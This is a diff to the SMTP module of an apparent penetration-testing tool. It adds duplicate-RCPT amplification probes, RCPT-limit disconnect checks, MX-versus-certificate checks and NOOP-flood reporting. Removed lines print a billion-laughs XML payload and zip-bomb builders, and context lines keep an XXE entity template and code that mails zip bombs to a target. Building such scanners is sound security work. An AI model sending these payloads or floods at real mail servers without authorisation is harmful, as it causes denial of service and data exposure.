@@ -4620,6 +4869,35 @@ class SMTP(BaseModule):
         limit_response: str | None = None
         first_policy_response: str | None = None  # First 554/550/553/450 for display
 
+        def _probe_disconnect_after_limit() -> tuple[bool, int]:
+            """Send up to RCPT_LIMIT_POSTHIT_PROBE_COUNT extra RCPT TOs after the per-message
+            limit has been detected to determine whether the server eventually closes the session.
+
+            Returns (disconnected, attempts_sent):
+              - disconnected=True if server returned 421 or closed the socket within the probe;
+              - disconnected=False if all probe iterations finished and the session stayed open.
+            """
+            probe_max = RCPT_LIMIT_POSTHIT_PROBE_COUNT
+            for j in range(1, probe_max + 1):
+                addr = f"posthit{j}@{domain}"
+                try:
+                    pst, prep = smtp.docmd("RCPT TO:", f"<{addr}>")
+                    self.ptdebug(
+                        f"POSTHIT [{j}/{probe_max}] RCPT TO:<{addr}> → "
+                        f"[{pst}] {_reply_one_line(prep)}",
+                        Out.INFO,
+                    )
+                    if pst == 421:
+                        return True, j
+                except (smtplib.SMTPServerDisconnected, ConnectionResetError,
+                        BrokenPipeError, EOFError, OSError):
+                    self.ptdebug(
+                        f"POSTHIT server closed connection after {j} extra rejects",
+                        Out.INFO,
+                    )
+                    return True, j
+            return False, probe_max
+
         for i in range(1, max_try + 1):
             if live_label is not None:
                 live_label[0] = f"Testing RCPT limit...  attempt {i}"
@@ -4668,12 +4946,20 @@ class SMTP(BaseModule):
                 # Per-message RCPT limit: 452 Too many recipients
                 if status == 452:
                     self.ptdebug(f"Server per-message limit after {accepted} recipients: {limit_response}", Out.INFO)
-                    return RcptLimitResult(accepted, True, limit_response, False)
+                    disc, posthit_n = _probe_disconnect_after_limit()
+                    return RcptLimitResult(
+                        accepted, True, limit_response, False,
+                        disconnect_after_limit=disc, posthit_probe_count=posthit_n,
+                    )
 
                 # Other 5xx
                 if 500 <= status <= 599:
                     self.ptdebug(f"Server limit after {accepted} recipients: {limit_response}", Out.INFO)
-                    return RcptLimitResult(accepted, True, limit_response, False)
+                    disc, posthit_n = _probe_disconnect_after_limit()
+                    return RcptLimitResult(
+                        accepted, True, limit_response, False,
+                        disconnect_after_limit=disc, posthit_probe_count=posthit_n,
+                    )
 
                 return RcptLimitResult(accepted, False, limit_response, False)
             except (smtplib.SMTPServerDisconnected, ConnectionResetError, BrokenPipeError, EOFError, OSError) as e:
@@ -4839,9 +5125,41 @@ class SMTP(BaseModule):
         return out
 
     @staticmethod
-    def _rl_role_label(role: str | None, port: int | str, auth_required: bool | None) -> str:
-        """Format `[*] Role: ...` info line for the pre-check verdict."""
+    def _rl_role_label(
+        role: str | None,
+        port: int | str,
+        auth_required: bool | None,
+        *,
+        rcpt_limit_submission: bool = False,
+    ) -> str:
+        """Format `[*] Role: ...` info line for the pre-check verdict.
+
+        For ``-rl`` with effective ``submission`` role, EHLO may still report
+        ``AUTH not required`` while the RCPT TO probe is intentionally run only
+        after ``LOGIN`` (``-u``/``-p``). In that case avoid a misleading
+        one-line ``AUTH not required`` that contradicts the skip message.
+        """
         role_str = (role or "unknown")
+        if rcpt_limit_submission and role_str == "submission":
+            if auth_required is True:
+                auth_label = "EHLO: AUTH — -rl probe uses -u/-p"
+            elif auth_required is False:
+                auth_label = (
+                    "EHLO: AUTH not advertised — -rl probe still needs -u/-p "
+                    "(or --rl-no-precheck)"
+                )
+            else:
+                auth_label = (
+                    "EHLO: AUTH unclear — -rl probe needs -u/-p "
+                    "(or --rl-no-precheck)"
+                )
+            return f"Role: {role_str} (port {port}, {auth_label})"
+        # Classic MTA: port hint MTA + no AUTH in EHLO → ``auth_required`` is left
+        # ``None`` because the RCPT-auth probe is *skipped* (see ``test_role``), not
+        # because we failed to learn anything. Avoid alarming "AUTH inconclusive".
+        if role_str == "mta" and auth_required is None:
+            auth_label = "EHLO: AUTH not advertised — MTA (RCPT-auth probe skipped)"
+            return f"Role: {role_str} (port {port}, {auth_label})"
         if auth_required is True:
             auth_label = "AUTH required"
         elif auth_required is False:
@@ -4916,30 +5234,11 @@ class SMTP(BaseModule):
 
         self.ptdebug("RCPT TO limit test (per message)", title=True)
 
-        # Always populate self.results.info early so domain resolution + precheck work the same
-        # in standalone (-rl alone) and run-all flows. The transient handler is closed immediately
-        # so the next phase (precheck or probe) opens a fresh connection without leaking sockets
-        # against single-threaded test servers.
-        if not getattr(self.results, "info", None):
-            try:
-                _info_smtp, _info = self.initial_info(get_commands=True)
-                self.results.info = InfoResult(
-                    _info.banner,
-                    _info.ehlo,
-                    getattr(_info, "ehlo_starttls", None),
-                )
-                self.results.resolved_domain = self._get_domain_from_banner_or_ptr(self.results.info)
-                self.results.banner_requested = False
-                self.results.commands_requested = False
-                try:
-                    _info_smtp.quit()
-                except Exception:
-                    try:
-                        _info_smtp.close()
-                    except Exception:
-                        pass
-            except Exception as e:
-                self.ptdebug(f"Initial info failed before -rl precheck: {e}", Out.INFO)
+        # Populate self.results.info so domain resolution + precheck work the same in
+        # standalone (-rl alone) and run-all flows. Also makes the "Initial server
+        # information" header (banner + EHLO) visible in -vv (shared helper, used
+        # by -nf1/-nf2 too).
+        self._ensure_initial_info(fail_label="-rl precheck")
 
         domain = self._get_rcpt_limit_domain()
         raw_rl = getattr(self.args, "rcpt_limit", None)
@@ -4965,7 +5264,7 @@ class SMTP(BaseModule):
 
             if effective_role is not None:
                 self.ptprint(
-                    f"    {info_icon} {self._rl_role_label(effective_role, self.args.target.port, auth_required)}",
+                    f"    {info_icon} {self._rl_role_label(effective_role, self.args.target.port, auth_required, rcpt_limit_submission=(effective_role == 'submission'))}",
                     Out.TEXT,
                 )
             else:
@@ -5151,6 +5450,8 @@ class SMTP(BaseModule):
                 skip_reason=None,
                 skip_message=None,
                 recipients_source=recipients_source,
+                disconnect_after_limit=getattr(result, "disconnect_after_limit", None),
+                posthit_probe_count=getattr(result, "posthit_probe_count", 0),
             )
         finally:
             if _show_progress:
@@ -5160,6 +5461,106 @@ class SMTP(BaseModule):
                     smtp.close()
                 except Exception:
                     pass
+
+    def test_rcpt_duplicate(self) -> RcptDuplicateResult:
+        """Many RCPT TO for the same address in one MAIL transaction (-rdd / --rcpt-duplicate)."""
+        self.ptdebug("Duplicate RCPT TO probe (-rdd)", title=True)
+        self._ensure_initial_info(fail_label="-rdd")
+
+        raw = (self.args.rcpt_to or "").strip()
+        if not raw or "@" not in raw:
+            raise ValueError("-rdd requires -r/--rcpt-to as a full address (user@domain)")
+
+        dom = raw.split("@", 1)[1].strip().lower().rstrip(".")
+        display_to = raw.strip("<>").strip()
+        rcpt_bracket = raw if raw.startswith("<") and raw.endswith(">") else f"<{display_to}>"
+
+        n = int(self.args.rcpt_duplicate or RCPT_DUP_DEFAULT)
+        send_data = bool(getattr(self.args, "rcpt_duplicate_send", False))
+        probe_uuid = secrets.token_hex(8) if send_data else None
+
+        smtp: smtplib.SMTP | None = None
+        try:
+            smtp = self.get_smtp_handler(timeout=45.0)
+            code, reply = smtp.docmd("EHLO", self.fqdn)
+            if code != 250:
+                raise RuntimeError(
+                    f"EHLO failed: [{code}] {self.bytes_to_str(reply).strip()[:400]}"
+                )
+            try:
+                smtp.docmd("RSET")
+            except Exception:
+                pass
+
+            ok_mail, mail_used = self._try_mail_from_for_rcpt_probe(smtp, dom)
+            if not ok_mail:
+                raise RuntimeError("MAIL FROM rejected for all candidates (cannot probe RCPT)")
+
+            replies: list[tuple[int, str]] = []
+            for _ in range(n):
+                st, rp = smtp.docmd("RCPT TO:", rcpt_bracket)
+                rps = self.bytes_to_str(rp).strip()[:500]
+                replies.append((st, rps))
+
+            rcpt_ok = tuple(replies)
+            first_fail: int | None = None
+            for i, (st, _) in enumerate(rcpt_ok):
+                if st not in (250, 251, 252):
+                    first_fail = i
+                    break
+            all_2xx = first_fail is None
+
+            data_sent = False
+            dcode: int | None = None
+            drep: str | None = None
+
+            if send_data and all_2xx:
+                msg_lines = [
+                    f"From: penterep-rdd@{dom}",
+                    f"To: {display_to}",
+                    f"Subject: penterep-rcpt-dup {probe_uuid}",
+                    f"Message-ID: <penterep-rdd-{probe_uuid}@{dom}>",
+                    f"X-Penterep-RDD-Probe: {probe_uuid}",
+                    "",
+                    f"Duplicate RCPT probe id: {probe_uuid}",
+                    "Verify manually how many copies arrived in the recipient mailbox.",
+                    "Submitted after repeated RCPT TO for the same address in one SMTP transaction.",
+                ]
+                raw_msg = "\r\n".join(msg_lines)
+                try:
+                    dcode, drp = smtp.data(raw_msg)
+                    drep = self.bytes_to_str(drp).strip()[:500]
+                    data_sent = dcode == 250
+                except Exception as e:
+                    drep = str(e).strip()[:500]
+                    data_sent = False
+            else:
+                try:
+                    smtp.docmd("RSET")
+                except Exception:
+                    pass
+
+            return RcptDuplicateResult(
+                recipient=display_to,
+                duplicate_count=n,
+                rcpt_replies=rcpt_ok,
+                all_rcpt_2xx=all_2xx,
+                first_failure_index=first_fail,
+                data_sent=data_sent,
+                data_code=dcode,
+                data_reply_snippet=drep,
+                mail_from_used=mail_used,
+                probe_uuid=probe_uuid,
+            )
+        finally:
+            if smtp is not None:
+                try:
+                    smtp.quit()
+                except Exception:
+                    try:
+                        smtp.close()
+                    except Exception:
+                        pass
 
     def _build_accepted_domain_probe_candidates(self) -> list[str]:
         """Ordered domain candidates: -d only, else inferred + parent + invalid.invalid control."""
@@ -9047,6 +9448,24 @@ class SMTP(BaseModule):
                     warnings.append(f"RSA key {pubkey.key_size} bits (< 2048, weak)")
             except Exception:
                 pass
+            try:
+                now = datetime.now(timezone.utc)
+                naa = getattr(cert, "not_valid_after_utc", None)
+                if naa is None:
+                    naa = cert.not_valid_after.replace(tzinfo=timezone.utc)
+                nba = getattr(cert, "not_valid_before_utc", None)
+                if nba is None:
+                    nba = cert.not_valid_before.replace(tzinfo=timezone.utc)
+                if now > naa:
+                    warnings.append("Certificate expired (past not_valid_after)")
+                elif now < nba:
+                    warnings.append("Certificate not yet valid (before not_valid_before)")
+                else:
+                    days_left = (naa - now).days
+                    if days_left <= 14:
+                        warnings.append(f"Certificate expires within {max(0, days_left)} days")
+            except Exception:
+                pass
             return warnings
 
         subject, issuer, san_list = "", "", []
@@ -9115,6 +9534,113 @@ class SMTP(BaseModule):
         cipher_warnings: list[str] = _analyze_cipher(sock)
         return (subject, issuer, san_list, is_self_signed, cert_warnings, cipher_warnings)
 
+    def _pick_mail_domain_for_mx_probe(
+        self, banner: str | None, ehlo_raw: str | None, connect_ip: str
+    ) -> str | None:
+        """Domain used for MX lookup (``-d`` / resolved / EHLO / banner / PTR registrable)."""
+        raw_d = getattr(self.args, "domain", None)
+        if raw_d and str(raw_d).strip():
+            return str(raw_d).strip().lower()
+        rd = getattr(self.results, "resolved_domain", None)
+        if rd and str(rd).strip():
+            return str(rd).strip().lower()
+        eh = _get_hostname_from_ehlo_raw(ehlo_raw)
+        if eh:
+            reg = _registrable_domain_psl(eh)
+            if reg:
+                return reg.lower()
+        bh = _hostname_from_banner(banner)
+        if bh:
+            reg = _registrable_domain_psl(bh)
+            if reg:
+                return reg.lower()
+        try:
+            ipaddress.ip_address(connect_ip)
+            ptr_host, _, _ = socket.gethostbyaddr(connect_ip)
+            if ptr_host and "." in ptr_host and _is_valid_hostname(ptr_host.strip()):
+                reg = _registrable_domain_psl(ptr_host.strip())
+                if reg:
+                    return reg.lower()
+        except (OSError, ValueError):
+            pass
+        return None
+
+    def _mx_hostnames_for_ip(self, mail_domain: str, ip: str) -> list[str]:
+        """MX exchange names (preference order) whose A/AAAA includes ``ip``."""
+        out: list[str] = []
+        try:
+            answers = dns.resolver.resolve(mail_domain, "MX", lifetime=6.0)
+        except Exception:
+            return out
+        mx_list = sorted(
+            [(r.preference, str(r.exchange).rstrip(".")) for r in answers],
+            key=lambda x: x[0],
+        )
+        for _pref, exch in mx_list:
+            if not exch or exch in out:
+                continue
+            hit = False
+            for resolver_name in ("A", "AAAA"):
+                try:
+                    for r in dns.resolver.resolve(exch, resolver_name, lifetime=4.0):
+                        if str(r) == ip:
+                            hit = True
+                            break
+                except Exception:
+                    continue
+                if hit:
+                    break
+            if hit:
+                out.append(exch)
+        return out
+
+    def _probe_mx_vs_tls_cert(
+        self,
+        connect_ip: str,
+        banner: str | None,
+        ehlo_raw: str | None,
+        tls_cert_subject: str | None,
+        tls_cert_issuer: str | None,
+        tls_cert_san: list[str],
+    ) -> tuple[bool | None, str | None, str | None, str | None]:
+        """Returns ``(mx_cert_ok, message, mx_peer_hostname, queried_domain)`` for -id output."""
+        mail_dom = self._pick_mail_domain_for_mx_probe(banner, ehlo_raw, connect_ip)
+        cert_blob = " ".join(
+            filter(None, [tls_cert_subject or "", tls_cert_issuer or ""] + (tls_cert_san or []))
+        )
+        if not cert_blob.strip():
+            return None, None, None, None
+        if not mail_dom:
+            msg = (
+                'MX vs cert: not checked (no mail domain inferred; pass -d example.com '
+                'to verify certificate against MX hostnames)'
+            )
+            return None, msg, None, None
+        try:
+            ipaddress.ip_address(connect_ip)
+        except ValueError:
+            msg = "MX vs cert: not checked (target is not an IP — MX A/AAAA match skipped)"
+            return None, msg, None, mail_dom
+        mx_peers = self._mx_hostnames_for_ip(mail_dom, connect_ip)
+        if not mx_peers:
+            msg = (
+                f'MX vs cert: no MX for "{mail_dom}" resolves to this address ({connect_ip}) '
+                f"— cannot verify operator name in certificate (try -d with the recipient domain)"
+            )
+            return False, msg, None, mail_dom
+        primary_mx = mx_peers[0]
+        if _cert_covers_dname(cert_blob, primary_mx):
+            msg = (
+                f'MX vs cert: TLS names cover MX host "{primary_mx}" '
+                f'(preferred MX for "{mail_dom}" whose A/AAAA includes this IP)'
+            )
+            return True, msg, primary_mx, mail_dom
+        msg = (
+            f'MX vs cert: TLS names do not cover MX host "{primary_mx}" '
+            f'(MX for "{mail_dom}") — possible name mismatch or multi-tenant endpoint'
+        )
+        return False, msg, primary_mx, mail_dom
+
     def test_server_identify(self) -> ServerIdentifyResult:
         """
         Identify SMTP server software from banner, EHLO, HELP, TLS cert, and optionally aggressive probes.
@@ -9136,6 +9662,11 @@ class SMTP(BaseModule):
         os_hint: str | None = None
         tls_policy: str | None = "n/a"
         id_aggressive = getattr(self.args, "id_aggressive", False)
+        cert_info = None
+        mx_cert_ok: bool | None = None
+        mx_cert_message: str | None = None
+        mx_peer_hostname: str | None = None
+        mx_queried_domain: str | None = None
 
         try:
             host, port = self.args.target.ip, self.args.target.port
@@ -9304,6 +9835,16 @@ class SMTP(BaseModule):
                 smtp.quit()
             except Exception:
                 pass
+
+            if cert_info:
+                mx_cert_ok, mx_cert_message, mx_peer_hostname, mx_queried_domain = self._probe_mx_vs_tls_cert(
+                    host,
+                    banner,
+                    ehlo_raw,
+                    tls_cert_subject,
+                    tls_cert_issuer,
+                    tls_cert_san,
+                )
         except Exception as e:
             raise
 
@@ -9331,6 +9872,10 @@ class SMTP(BaseModule):
             target_host=target_host,
             latency_avg_ms=latency_avg_ms,
             latency_jitter_ms=latency_jitter_ms,
+            mx_cert_ok=mx_cert_ok,
+            mx_cert_message=mx_cert_message,
+            mx_queried_domain=mx_queried_domain,
+            mx_peer_hostname=mx_peer_hostname,
         )
 
     def test_bounce_replay(self) -> BounceReplayResult:
@@ -11485,21 +12030,6 @@ class SMTP(BaseModule):
         if incl_zip_bomb_full and "zip_bomb_full" not in variants:
             variants.append("zip_bomb_full")
 
-        BILLION_LAUGHS_XML = """<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE lolz [
- <!ENTITY lol "lol">
- <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
- <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
- <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
- <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
- <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
- <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
- <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
- <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
- <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
-]>
-<lolz>&lol9;</lolz>"""
-
         def _xxe_xml_template(url: str) -> str:
             return f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "{url}">]>
@@ -11532,26 +12062,6 @@ class SMTP(BaseModule):
                     '</Relationships>'
                 ).encode("utf-8"))
                 zf.writestr("word/document.xml", xml_content)
-            return bio.getvalue()
-
-        def _build_minimal_zip_bomb() -> bytes:
-            """Minimal zip bomb: ~200KB compressed → moderate expansion (low DoS risk for testing)."""
-            bio = BytesIO()
-            data = b"\x00" * (10 * 1024)
-            with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
-                for i in range(20):
-                    zf.writestr(f"layer_{i}.bin", data)
-            return bio.getvalue()
-
-        def _build_full_zip_bomb() -> bytes:
-            """Full zip bomb: ~100KB compressed → ~100MB expanded (extreme ratio, high DoS risk).
-            Uses 10 files of 10MB zeros each; deflate achieves ~1000:1 for repeated bytes."""
-            bio = BytesIO()
-            chunk = b"\x00" * (1024 * 1024)  # 1 MB
-            data_10mb = chunk * 10  # 10 MB
-            with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
-                for i in range(10):
-                    zf.writestr(f"bomb_{i}.bin", data_10mb)
             return bio.getvalue()
 
         _ssl_ctx = ssl._create_unverified_context()
@@ -11673,12 +12183,12 @@ class SMTP(BaseModule):
                             f"\r\n{xxe_body_xml}"
                         )
                     elif var_name == "zip_bomb":
-                        zip_data = _build_minimal_zip_bomb()
+                        zip_data = build_minimal_zip_bomb()
                         raw_msg = _build_mime_with_attachment(
                             subject, "ZIPXXE zip bomb test (minimal). Monitor server resources.", zip_data, "zipbomb.zip", "application/zip"
                         )
                     elif var_name == "zip_bomb_full":
-                        zip_data = _build_full_zip_bomb()
+                        zip_data = build_full_zip_bomb()
                         raw_msg = _build_mime_with_attachment(
                             subject, "ZIPXXE full zip bomb (~100KB→~100MB). Monitor server! DoS risk.", zip_data, "zipbomb_full.zip", "application/zip"
                         )
@@ -12136,6 +12646,41 @@ class SMTP(BaseModule):
                 )
 
         return enum_results
+
+    def _ensure_initial_info(self, *, fail_label: str = "test") -> None:
+        """Populate ``self.results.info`` via a transient ``initial_info()`` call so
+        that ``-vv`` mode reliably shows the **Initial server information** header
+        (banner + EHLO response) for any standalone test that does not already
+        run inside the run-all/initial_info flow.
+
+        - No-op if ``self.results.info`` is already populated (run-all mode or a
+          previous test in the same invocation has cached it).
+        - Closes the info handler immediately; the calling test opens its own
+          fresh connection. Mirrors the pattern used by ``-rl`` (see
+          :py:meth:`test_rcpt_limit`) so output is consistent across
+          ``-rl`` / ``-nf1`` / ``-nf2`` etc.
+        """
+        if getattr(self.results, "info", None):
+            return
+        try:
+            _info_smtp, _info = self.initial_info(get_commands=True)
+            self.results.info = InfoResult(
+                _info.banner,
+                _info.ehlo,
+                getattr(_info, "ehlo_starttls", None),
+            )
+            self.results.resolved_domain = self._get_domain_from_banner_or_ptr(self.results.info)
+            self.results.banner_requested = False
+            self.results.commands_requested = False
+            try:
+                _info_smtp.quit()
+            except Exception:
+                try:
+                    _info_smtp.close()
+                except Exception:
+                    pass
+        except Exception as e:
+            self.ptdebug(f"Initial info failed before {fail_label}: {e}", Out.INFO)
 
     def initial_info(self, get_commands: bool = True) -> tuple[smtplib.SMTP, InfoResult]:
         """Connect and get banner; optionally get EHLO (commands). If PLAIN advertises STARTTLS,
@@ -12642,7 +13187,23 @@ class SMTP(BaseModule):
             self._maybe_stream_rcpt_limit_domain_hint(rlim.server_response)
         elif rlim.limit_triggered:
             icon = self._rcpt_limit_recipient_verdict_icon(rlim.max_accepted)
-            self.ptprint(f"    {icon} Per-message limit enforced after {rlim.max_accepted} recipients", Out.TEXT)
+            self.ptprint(
+                f"    {icon} Max {rlim.max_accepted} recipients per message (next recipients are rejected)",
+                Out.TEXT,
+            )
+            disc = getattr(rlim, "disconnect_after_limit", None)
+            if disc is True:
+                ok_icon = get_colored_text("[✓]", color="NOTVULN")
+                self.ptprint(
+                    f"    {ok_icon} Connection was disconnected after many invalid recipients",
+                    Out.TEXT,
+                )
+            elif disc is False:
+                bad_icon = get_colored_text("[✗]", color="VULN")
+                self.ptprint(
+                    f"    {bad_icon} Connection is not disconnected after many invalid recipients",
+                    Out.TEXT,
+                )
             self._stream_rcpt_limit_server_response_verbose(rlim.server_response)
             if rlim.max_accepted == 0:
                 self._maybe_stream_rcpt_limit_domain_hint(rlim.server_response)
@@ -12657,6 +13218,57 @@ class SMTP(BaseModule):
                     f"    {icon} No limit or too high: {rlim.max_accepted} recipients accepted",
                     Out.TEXT,
                 )
+
+    def _stream_rcpt_duplicate_result(self) -> None:
+        if (err := self.results.rcpt_duplicate_error) is not None:
+            if _rcpt_duplicate_error_is_environmental(err):
+                icon = get_colored_text("[i]", color="INFO")
+                self.ptprint(
+                    f"    {icon} Duplicate RCPT probe could not run: {err}",
+                    Out.TEXT,
+                )
+            else:
+                icon = get_colored_text("[✗]", color="VULN")
+                self.ptprint(f"    {icon} Duplicate RCPT probe failed: {err}", Out.TEXT)
+            return
+        r = self.results.rcpt_duplicate
+        if r is None:
+            return
+        ok_icon = get_colored_text("[✓]", color="NOTVULN")
+        vuln_icon = get_colored_text("[✗]", color="VULN")
+        info_icon = get_colored_text("[i]", color="INFO")
+        if r.all_rcpt_2xx:
+            icon = vuln_icon if r.duplicate_count >= 3 else info_icon
+            self.ptprint(
+                f"    {icon} All {r.duplicate_count} duplicate RCPT TO accepted for {r.recipient!r} "
+                f"(delivery fan-out is implementation-defined; check mailbox / logs manually)",
+                Out.TEXT,
+            )
+        else:
+            fi = r.first_failure_index
+            c = r.rcpt_replies[fi][0] if fi is not None and fi < len(r.rcpt_replies) else "?"
+            self.ptprint(
+                f"    {ok_icon} Duplicate RCPT not fully accepted "
+                f"(first non-2xx at #{fi + 1 if fi is not None else '?'}: {c})",
+                Out.TEXT,
+            )
+        if r.data_sent and r.probe_uuid:
+            self.ptprint(
+                f"    {info_icon} DATA accepted with probe id {r.probe_uuid} — correlate in recipient inbox",
+                Out.TEXT,
+            )
+        if r.all_rcpt_2xx and r.duplicate_count >= 3:
+            self.ptprint(
+                f"    {info_icon} Expect one delivery after DATA if amplification is mitigated; "
+                f"several copies or leaky Delivered-To/Received warrant documenting",
+                Out.TEXT,
+            )
+        if getattr(self.args, "rcpt_duplicate_send", False) and not r.data_sent:
+            extra = f": {r.data_reply_snippet}" if r.data_reply_snippet else ""
+            self.ptprint(
+                f"    {info_icon} DATA not completed{extra}",
+                Out.TEXT,
+            )
 
     def _stream_blacklist_result(self) -> None:
         if (blacklist_error := self.results.blacklist_error) is not None:
@@ -13146,6 +13758,15 @@ class SMTP(BaseModule):
                     self.ptprint(f"        {ss_icon} Self-signed: yes", Out.TEXT)
                 else:
                     self.ptprint(f"        {ok_icon} Self-signed: no", Out.TEXT)
+                mx_msg = getattr(r, "mx_cert_message", None)
+                mx_st = getattr(r, "mx_cert_ok", None)
+                if mx_msg:
+                    if mx_st is True:
+                        self.ptprint(f"        {ok_icon} {mx_msg}", Out.TEXT)
+                    elif mx_st is False:
+                        self.ptprint(f"        {warn_icon} {mx_msg}", Out.TEXT)
+                    else:
+                        self.ptprint(f"        {id_detail_icon} {mx_msg}", Out.TEXT)
                 if getattr(r, "tls_policy", None) and r.tls_policy != "n/a":
                     self.ptprint(f"        TLS policy: {r.tls_policy}", Out.TEXT)
                 if getattr(r, "tls_downgrade_probed", False):
@@ -13157,6 +13778,11 @@ class SMTP(BaseModule):
                         self.ptprint(f"        {ok_icon} TLS downgrade: TLS 1.0/1.1 rejected (Good)", Out.TEXT)
                 if getattr(r, "cert_domain_match", False):
                     self.ptprint(f"        {ok_icon} Cert domain match: SAN aligns with target", Out.TEXT)
+                elif has_tls_cert and (r.tls_cert_subject or (r.tls_cert_san and len(r.tls_cert_san) > 0)):
+                    self.ptprint(
+                        f"        {id_detail_icon} Cert domain match: no clear SAN/Subject tie to connection target",
+                        Out.TEXT,
+                    )
                 for w in getattr(r, "tls_cert_warnings", None) or []:
                     self.ptprint(f"        {warn_icon} {w}", Out.TEXT)
                 for w in getattr(r, "tls_cipher_warnings", None) or []:
@@ -13941,6 +14567,8 @@ class SMTP(BaseModule):
 
         vuln_icon = get_colored_text("[✗]", color="VULN")
         ok_icon = get_colored_text("[OK]", color="NOTVULN")
+        warn_icon = get_colored_text("[!]", color="VULN")
+        info_icon = get_colored_text("[*]", color="INFO")
 
         # 1) Time between two commands (average reaction time under load).
         if r.avg_rt_seconds is not None:
@@ -13976,6 +14604,25 @@ class SMTP(BaseModule):
             self.ptprint(
                 f"    {vuln_icon} Error rate: {err_rate:.0f}% "
                 f"(over {NOOP_FLOOD_ERROR_RATE_OK_MAX_PCT:.0f}%)",
+                Out.TEXT,
+            )
+
+        # 3) Connection survival summary — informs the analyst whether the
+        #    server endured the storm or kicked clients out.
+        if r.early_exit_no_connections:
+            # The server actively cut every socket before our time-budget
+            # expired — that's effectively a successful disconnect-storm DoS,
+            # so flag it as a warning rather than a neutral note.
+            self.ptprint(
+                f"    {warn_icon} Server disconnected all connections before test time limit",
+                Out.TEXT,
+            )
+        if r.established_connections > 0 and r.disconnected_during_test > 0:
+            pct = 100.0 * r.disconnected_during_test / r.established_connections
+            self.ptprint(
+                f"    {info_icon} Disconnected connections during test: "
+                f"{r.disconnected_during_test} from {r.established_connections} "
+                f"({pct:.0f}%)",
                 Out.TEXT,
             )
 
@@ -14211,7 +14858,14 @@ class SMTP(BaseModule):
                     "(policy rejects, session not closed)"
                 )
             elif rlim.limit_triggered:
-                parts.append(f"Per-message limit enforced after {rlim.max_accepted} recipients")
+                parts.append(
+                    f"Max {rlim.max_accepted} recipients per message (next recipients are rejected)"
+                )
+                disc = getattr(rlim, "disconnect_after_limit", None)
+                if disc is True:
+                    parts.append("Connection was disconnected after many invalid recipients")
+                elif disc is False:
+                    parts.append("Connection is not disconnected after many invalid recipients")
             else:
                 if rlim.max_accepted == 0:
                     parts.append("Could not determine RCPT limit")
@@ -14219,6 +14873,38 @@ class SMTP(BaseModule):
                     parts.append(f"No limit detected (tested {rlim.max_accepted} recipients)")
         elif (rcpt_err := self.results.rcpt_limit_error) is not None:
             parts.append(f"RCPT limit error: {rcpt_err}")
+
+        if (rdd_err := self.results.rcpt_duplicate_error) is not None:
+            if _rcpt_duplicate_error_is_environmental(rdd_err):
+                parts.append(
+                    f"Duplicate RCPT probe could not run (server policy / auth): {rdd_err}"
+                )
+            else:
+                parts.append(f"Duplicate RCPT probe error: {rdd_err}")
+        elif (rdd := self.results.rcpt_duplicate) is not None:
+            bits = [
+                f"Duplicate RCPT TO: {rdd.duplicate_count}× same recipient ({rdd.recipient!r}) "
+                f"in one MAIL transaction",
+            ]
+            if rdd.all_rcpt_2xx:
+                bits.append("All RCPT replies were 2xx (server accepted each duplicate RCPT)")
+            elif rdd.first_failure_index is not None:
+                i = rdd.first_failure_index
+                c = rdd.rcpt_replies[i][0] if i < len(rdd.rcpt_replies) else "?"
+                bits.append(f"First non-2xx RCPT at position {i + 1} (code {c})")
+            if rdd.data_sent:
+                bits.append(
+                    f"DATA submitted (probe {rdd.probe_uuid or 'n/a'}); verify inbox manually for copy count"
+                )
+            elif getattr(self.args, "rcpt_duplicate_send", False):
+                bits.append("DATA not sent (not all RCPT were 2xx or DATA failed)")
+            if rdd.all_rcpt_2xx and rdd.duplicate_count >= 3:
+                bits.append(
+                    "PTV-SVC-SMTP-RCPTDUP: With sound DATA handling expect one mailbox copy; several "
+                    "copies = amplification risk. Check Delivered-To / Received for duplicate routing "
+                    "even if only one message arrived."
+                )
+            parts.append("\r\n".join(bits))
 
         if (adp_err := self.results.accepted_domain_probe_error) is not None:
             parts.append(f"Accepted recipient domain probe error: {adp_err}")
@@ -14285,6 +14971,17 @@ class SMTP(BaseModule):
                     f"(avg {_noop_rt_window_display(nf2.avg_rt_seconds)})"
                 )
             nf2_parts.append(f"Error rate: {nf2.error_rate_pct:.0f}%")
+            if nf2.early_exit_no_connections:
+                nf2_parts.append(
+                    "Server disconnected all connections before test time limit"
+                )
+            if nf2.established_connections > 0 and nf2.disconnected_during_test > 0:
+                pct = 100.0 * nf2.disconnected_during_test / nf2.established_connections
+                nf2_parts.append(
+                    "Disconnected during test: "
+                    f"{nf2.disconnected_during_test} from "
+                    f"{nf2.established_connections} ({pct:.0f}%)"
+                )
             parts.append("\r\n".join(nf2_parts))
         elif (nf2_err := self.results.noop_flood2_error) is not None:
             parts.append(f"NOOP flood DoS error: {nf2_err}")
@@ -14437,6 +15134,10 @@ class SMTP(BaseModule):
                 vulns.append({"vuln_code": VULNS.NoopFloodDosSlow.value})
             if nf2.error_rate_pct > NOOP_FLOOD_ERROR_RATE_OK_MAX_PCT:
                 vulns.append({"vuln_code": VULNS.NoopFloodDosErrors.value})
+            # All sockets cut by the server before the time-budget elapsed —
+            # the storm itself is enough to take the listener offline.
+            if nf2.early_exit_no_connections:
+                vulns.append({"vuln_code": VULNS.NoopFloodDosDropAll.value})
 
         if rl := self.results.rate_limit:
